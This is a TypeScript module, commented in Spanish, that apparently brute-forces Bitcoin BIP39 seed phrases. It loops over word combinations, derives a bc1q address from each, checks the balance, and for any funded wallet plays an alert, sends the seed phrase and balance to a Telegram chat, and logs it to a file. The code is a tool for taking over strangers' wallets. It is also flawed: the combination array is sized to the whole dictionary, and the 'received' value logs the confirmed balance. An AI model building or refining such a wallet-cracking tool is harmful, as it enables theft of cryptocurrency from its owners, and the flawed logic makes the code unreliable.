import * as path from "path";
import { generarWallet_BTC } from "./generarWallet_BTC";
import { consultarSaldoWallet } from "../consultas/consultarSaldoWallet";
import { exec } from 'child_process';
import { leerSeguimientoIndice } from "./leerSeguimientoIndice";
import { leerSeguimientoWalletCash } from "./leerSeguimientoWalletCash";
import { escribirSeguimientoIndice } from "./escribirSeguimientoIndice";
import { escribirWalletConCash } from "./escribirWalletConCash";
import { diccionarioMezclado } from "../data/diccionario/diccionarioBIP39";
import { enviarMensajeTelegram } from "./telegram/telegram";

//ruta del sonido 
const rutaSonido = path.join(__dirname, '../data/sonido/mision-cumplida1.wav');
const rutaSonido2 = path.join(__dirname, '../data/sonido/bell-sound-final.wav');

// Función principal para generar combinaciones
export const generarCombinacion = async (): Promise<void> => {
  let seguimientoIndice = leerSeguimientoIndice();
  let walletConCash = leerSeguimientoWalletCash();

  // Si el array de seguimiento está vacío, iniciar desde la primera combinación
  if (seguimientoIndice.length === 0) {
    seguimientoIndice = [Array(diccionarioMezclado.length).fill(0)];
  }

  // Bucle para generar combinaciones
  while (true) {
    const indices = seguimientoIndice[seguimientoIndice.length - 1];
    const palabras = indices.map((i) => diccionarioMezclado[i]);

    // Generar la wallet BTC usando la frase semilla
    const wallet_BTC = generarWallet_BTC(palabras.join(" "));
    // Consultar el saldo de la wallet
    const saldoWallet = await consultarSaldoWallet(wallet_BTC.Direccion_bc1q);

    if (saldoWallet.confirmed > 0 || saldoWallet.received > 0 || saldoWallet.unconfirmed > 0) {

      //encontrar wallet con balance positivo
      if(saldoWallet.confirmed > 0 || saldoWallet.unconfirmed){

        //reproducir sonido
        exec(`powershell -c (New-Object Media.SoundPlayer '${rutaSonido}').PlaySync();`);

        //enviar mensaje por telegram
        enviarMensajeTelegram(palabras.join(" "), wallet_BTC.Direccion_bc1q, String(saldoWallet.confirmed), String(saldoWallet.received), String(saldoWallet.unconfirmed));
      }

      // Reproducir el sonido de alerta wallet valida vacia
      exec(`powershell -c (New-Object Media.SoundPlayer '${rutaSonido2}').PlaySync();`);

      // Crear el nuevo registro: [fraseSemilla, funded_txo_sum, fechaCreacion]
      const nuevoRegistro: [string, string, string, string] = [
        palabras.join(" "),
        `confirmado: ${saldoWallet.confirmed}, recibido: ${saldoWallet.confirmed}, sin confirmar: ${saldoWallet.unconfirmed}`,
        wallet_BTC.Direccion_bc1q,
        new Date().toISOString(),
      ];

      // Agregar el nuevo registro al array en memoria y actualizar el archivo
      walletConCash.push(nuevoRegistro);
      escribirWalletConCash(walletConCash);
    }

    console.log(
      `Wallet: ${wallet_BTC.Direccion_bc1q} > Saldo wallet: ${saldoWallet.confirmed}, Recibido: ${saldoWallet.received}, Sin confirmar: ${saldoWallet.unconfirmed}`
    );

    // Incrementar el último índice
    indices[indices.length - 1]++;
    // Manejar el desbordamiento de índices
    for (let i = indices.length - 1; i >= 0; i--) {
      if (indices[i] >= diccionarioMezclado.length) {
        if (i === 0) {
          console.log("Se han generado todas las combinaciones posibles.");
          return;
        }
        indices[i] = 0;
        indices[i - 1]++;
      }
    }

    seguimientoIndice.push([...indices]);
    escribirSeguimientoIndice(seguimientoIndice);
  }
};